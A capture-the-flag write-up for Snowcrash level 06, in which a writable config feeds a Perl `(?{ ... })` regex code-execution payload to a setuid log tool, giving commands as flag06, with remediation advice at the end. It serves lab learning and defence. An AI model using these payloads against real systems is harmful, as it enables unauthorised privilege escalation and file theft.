# Snowcrash — Level 06

**Objective:** escalate from `level06` to `flag06` and read the flag.

---

## Reconnaissance

```bash
id
# groups: level06, levelgroup, raven
```

The `raven` group is new — enumerate what it owns:

```bash
find / -group raven 2>/dev/null
# /etc/raven
# /etc/raven/raven.conf
# /opt/snowcrash/level06/raven
# /opt/snowcrash/level06/raven.pl
```

```bash
cat /etc/raven/raven.conf
```

```ini
log_dir          = /var/log/snowcrash
max_size         = 10485760
retention_days   = 7
loglevel_pattern = ^(DEBUG|INFO|WARN|ERROR):
```

`loglevel_pattern` is a regex read from a writable file — worth investigating.

```bash
ls -la /etc/raven/
ls -la /opt/snowcrash/level06/raven
```

The binary is **setuid `flag06`**.

```bash
cat /opt/snowcrash/level06/raven.pl
```

Relevant snippets:

```perl
use re 'eval';                                    # line ~15

my %CONFIG = ( ..., loglevel_pattern => ..., ... );

# config parser
$CONFIG{$key} = $val if exists $CONFIG{$key};     # accepts any key already in %CONFIG

# sink
if ($line =~ /$pattern/) { ... }                  # $pattern = $CONFIG{loglevel_pattern}
```

---

## Vulnerability

Three facts combine:

1. `use re 'eval';` disables Perl's protection against `(?{ CODE })` assertions inside interpolated patterns. Without this pragma, `"(?{...})"` in a variable is a compile error; with it, the code runs.
2. `loglevel_pattern` is a `%CONFIG` key, so the config parser will accept our override from `raven.conf`.
3. `raven.conf` is group-writable by `raven`, and we're in `raven`.
4. `raven` is setuid `flag06`, so the Perl code runs as `flag06`.

Result: **arbitrary Perl execution as `flag06`** via a malicious regex in the config file.

---

## Exploitation

### 1. Back up the config

```bash
cp /etc/raven/raven.conf /tmp/raven.conf.bak
```

### 2. Write the malicious config

Two things change:

- `log_dir` → point it at a directory we control. The original `/var/log/snowcrash` may not have files, and `process_log_file` is never reached if there's nothing to open — meaning the pattern is never compiled.
- `loglevel_pattern` → the payload. The parser strips `#` (comment) and trailing whitespace from values, so the payload must contain **no `#` and no trailing whitespace**.

```bash
cat > /etc/raven/raven.conf <<'EOF'
# raven configuration
log_dir          = /tmp/snowcrash_logs
max_size         = 10485760
retention_days   = 7
loglevel_pattern = (?{ system("/bin/sh","-c","cat /home/flag06/.flag > /tmp/level06_loot 2>&1; chmod 666 /tmp/level06_loot") })
EOF
```

- `(?{ ... })` is a zero-width assertion — it matches at position 0 of **any** line, so the first line of the first log file triggers it.
- `system("/bin/sh","-c",...)` with three args always execs `/bin/sh -c`, regardless of Perl's shell-metachar heuristic. Our payload contains `>`, `;` so we want the shell explicit.
- `chmod 666` on the output ensures `level06` can read it after `flag06` writes it.

### 3. Create a trigger file

`validate_log_dir` (called before `process_log_file`) only checks `-e -d -r` as `flag06`. `755` on the directory and `644` on the file pass.

```bash
mkdir -p /tmp/snowcrash_logs
echo "DEBUG: trigger" > /tmp/snowcrash_logs/trigger.log
chmod 755 /tmp/snowcrash_logs
chmod 644 /tmp/snowcrash_logs/trigger.log
```

The line content doesn't matter — the zero-width assertion fires on it.

### 4. Trigger

```bash
/opt/snowcrash/level06/raven
```

`raven` is setuid `flag06`, so it runs `raven.pl` as `flag06`. Within `process_log_file`, the first line compiles `$pattern`, hits `(?{ ... })`, and executes our command.

### 5. Read the loot

```bash
cat /tmp/level06_loot
```

---

## Flag

The contents of `/tmp/level06_loot`.

---

## Troubleshooting

### A. Prove the injection fires before chasing the flag

Replace the payload with:

```
loglevel_pattern = (?{ system("/bin/sh","-c","id > /tmp/level06_probe 2>&1; chmod 666 /tmp/level06_probe") })
```

Trigger, then:

```bash
cat /tmp/level06_probe
```

- `uid=... (flag06)` → injection confirmed, restore the real payload.
- `uid=... (level06)` → `raven` is not setuid; the injection works but isn't privileged. Look for the actual trigger path:
  ```bash
  systemctl show raven.service -p ExecMainExitTimestamp -p ExecMainStatus
  grep -r raven /etc/cron* /var/spool/cron 2>/dev/null
  ```
- Probe file missing → the trigger never fired. The config was never read, or `raven` errored before reaching `process_log_file`. Check `raven.pl`'s `validate_log_dir` on your `log_dir`.

### B. If `/home/flag06/.flag` is empty

You have **shell as flag06**, not just a `cat`. Enumerate everything flag06 owns:

```
loglevel_pattern = (?{ system("/bin/sh","-c","find / -user flag06 -type f -exec ls -la {} + > /tmp/level06_loot 2>&1; chmod 666 /tmp/level06_loot") })
```

Then look at `/tmp/level06_loot` for a file that isn't 0 bytes.

### C. Restore the config after

```bash
cp /tmp/raven.conf.bak /etc/raven/raven.conf
```

---

## Remediation

- **Remove `use re 'eval';`** — the script does not need executable regex assertions.
- **Validate `loglevel_pattern` structurally** against an allowlist, e.g.:
  ```perl
  die "bad pattern" unless $CONFIG{loglevel_pattern} =~ /^\(\?\w[\w:|]*\)$/;
  ```
- **Protect the config file**: root-owned `0644`, or `0640` with a dedicated read-only service user. Never group-writable by a group the invoking user belongs to.
- **Drop setuid** where possible — run `raven.pl` under a dedicated, low-privilege service account via systemd.
- **Do not build `system(...)` arguments** from data the config file can influence. If unavoidable, use the 3-arg form with fixed arguments only.